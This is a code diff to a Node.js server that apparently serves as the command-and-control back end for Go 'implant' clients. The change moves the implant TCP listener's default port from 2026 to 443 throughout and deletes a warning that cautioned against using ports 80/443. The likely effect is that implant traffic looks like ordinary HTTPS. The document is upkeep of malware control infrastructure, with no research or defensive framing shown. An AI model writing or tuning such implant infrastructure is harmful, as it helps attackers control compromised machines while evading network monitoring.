@@ -1,4 +1,4 @@
-// override: true — PM2 often sets TCP_PORT=80 in ecosystem; .env TCP_PORT=2026 must win for Go clients.
+// override: true — PM2 often sets TCP_PORT=80 in ecosystem; .env TCP_PORT=443 must win for Go clients.
 require('dotenv').config({ override: true });
 const express = require('express');
 const http = require('http');
@@ -512,7 +512,7 @@ function persistDb() {
 }
 
 const defaultSettings = {
-  serverPort: 2026,
+  serverPort: 443,
   serverHost: '0.0.0.0',
   maxClients: 100,
   heartbeatInterval: 60,
@@ -1302,28 +1302,22 @@ function createTcpServer() {
 function normalizeTcpListenPort(raw) {
   const n = Number(raw);
   if (Number.isFinite(n) && n > 0 && n < 65536) return Math.floor(n);
-  console.warn('[TCP] Invalid TCP port', raw, '- using 2026');
-  return 2026;
+  console.warn('[TCP] Invalid TCP port', raw, '- using 443');
+  return 443;
 }
 
 /**
  * Implant TCP must not share the HTTP server port. If they match (e.g. .env TCP_PORT=5000 with PORT=5000),
- * use 2026 — the default expected by lastfinalversion2.go.
- * Ports 80/443 see HTTP/TLS probes → JSON parse errors in logs; warn only.
+ * use 443 — the default expected by lastfinalversion2.go.
  */
 function resolveImplantTcpPort(rawTcpPort, rawHttpPort) {
   const httpP = normalizeTcpListenPort(rawHttpPort);
   let tcpP = normalizeTcpListenPort(rawTcpPort);
   if (tcpP === httpP) {
     console.warn(
-      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Using 2026 for Go implant TCP. Fix .env: TCP_PORT=2026`
+      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Using 443 for Go implant TCP. Fix .env: TCP_PORT=443`
     );
-    tcpP = 2026;
-  }
-  if (tcpP === 80 || tcpP === 443) {
-    console.warn(
-      `[TCP] Listening on ${tcpP} will get HTTP/TLS scanners (JSON parse errors). Prefer TCP_PORT=2026 for implants.`
-    );
+    tcpP = 443;
   }
   return tcpP;
 }
@@ -1382,7 +1376,7 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
     const s = getAllSettings();
     const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
     const httpPort = Number(process.env.PORT || 5000);
-    const tcpPort = resolveImplantTcpPort(process.env.TCP_PORT || s.serverPort || 2026, httpPort);
+    const tcpPort = resolveImplantTcpPort(process.env.TCP_PORT || s.serverPort || 443, httpPort);
     try {
       await startTcpServer(tcpHost, tcpPort);
     } catch (e) {
@@ -1830,7 +1824,7 @@ app.put('/api/settings', async (req, res) => {
   // Hot-restart TCP server if host/port changed
   const s = getAllSettings();
   try {
-    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 2026);
+    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 443);
     res.json({ ok: true });
   } catch (e) {
     console.error('Failed to restart TCP server:', e.message);
